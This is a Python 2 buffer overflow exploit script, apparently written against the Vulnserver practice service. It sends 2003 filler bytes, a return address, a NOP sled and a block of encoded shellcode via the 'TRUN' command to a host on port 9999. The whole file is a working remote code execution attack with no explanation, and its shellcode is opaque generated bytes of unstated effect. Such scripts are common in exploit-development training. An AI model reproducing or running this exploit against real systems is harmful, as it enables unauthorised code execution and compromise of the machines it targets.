#!/usr/bin/python
import sys
import socket

overflow =  b""
overflow += b"\xda\xde\xd9\x74\x24\xf4\xbf\xbf\x0b\x61\xdf\x58\x29"
overflow += b"\xc9\xb1\x52\x31\x78\x17\x03\x78\x17\x83\x57\xf7\x83"
overflow += b"\x2a\x5b\xe0\xc6\xd5\xa3\xf1\xa6\x5c\x46\xc0\xe6\x3b"
overflow += b"\x03\x73\xd7\x48\x41\x78\x9c\x1d\x71\x0b\xd0\x89\x76"
overflow += b"\xbc\x5f\xec\xb9\x3d\xf3\xcc\xd8\xbd\x0e\x01\x3a\xff"
overflow += b"\xc0\x54\x3b\x38\x3c\x94\x69\x91\x4a\x0b\x9d\x96\x07"
overflow += b"\x90\x16\xe4\x86\x90\xcb\xbd\xa9\xb1\x5a\xb5\xf3\x11"
overflow += b"\x5d\x1a\x88\x1b\x45\x7f\xb5\xd2\xfe\x4b\x41\xe5\xd6"
overflow += b"\x85\xaa\x4a\x17\x2a\x59\x92\x50\x8d\x82\xe1\xa8\xed"
overflow += b"\x3f\xf2\x6f\x8f\x9b\x77\x6b\x37\x6f\x2f\x57\xc9\xbc"
overflow += b"\xb6\x1c\xc5\x09\xbc\x7a\xca\x8c\x11\xf1\xf6\x05\x94"
overflow += b"\xd5\x7e\x5d\xb3\xf1\xdb\x05\xda\xa0\x81\xe8\xe3\xb2"
overflow += b"\x69\x54\x46\xb9\x84\x81\xfb\xe0\xc0\x66\x36\x1a\x11"
overflow += b"\xe1\x41\x69\x23\xae\xf9\xe5\x0f\x27\x24\xf2\x70\x12"
overflow += b"\x90\x6c\x8f\x9d\xe1\xa5\x54\xc9\xb1\xdd\x7d\x72\x5a"
overflow += b"\x1d\x81\xa7\xcd\x4d\x2d\x18\xae\x3d\x8d\xc8\x46\x57"
overflow += b"\x02\x36\x76\x58\xc8\x5f\x1d\xa3\x9b\x55\xe8\xa1\x59"
overflow += b"\x02\xee\xb5\x44\x92\x67\x53\x1c\x02\x2e\xcc\x89\xbb"
overflow += b"\x6b\x86\x28\x43\xa6\xe3\x6b\xcf\x45\x14\x25\x38\x23"
overflow += b"\x06\xd2\xc8\x7e\x74\x75\xd6\x54\x10\x19\x45\x33\xe0"
overflow += b"\x54\x76\xec\xb7\x31\x48\xe5\x5d\xac\xf3\x5f\x43\x2d"
overflow += b"\x65\xa7\xc7\xea\x56\x26\xc6\x7f\xe2\x0c\xd8\xb9\xeb"
overflow += b"\x08\x8c\x15\xba\xc6\x7a\xd0\x14\xa9\xd4\x8a\xcb\x63"
overflow += b"\xb0\x4b\x20\xb4\xc6\x53\x6d\x42\x26\xe5\xd8\x13\x59"
overflow += b"\xca\x8c\x93\x22\x36\x2d\x5b\xf9\xf2\x4d\xbe\x2b\x0f"
overflow += b"\xe6\x67\xbe\xb2\x6b\x98\x15\xf0\x95\x1b\x9f\x89\x61"
overflow += b"\x03\xea\x8c\x2e\x83\x07\xfd\x3f\x66\x27\x52\x3f\xa3"

nops = '\x90' * 32

shellcode = 'A' * 2003
shellcode += '\xaf\x11\x50\x62' + nops + overflow

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.10.10.3', 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except Exception, e:
    print('Exception: %s' % e)
    sys.exit()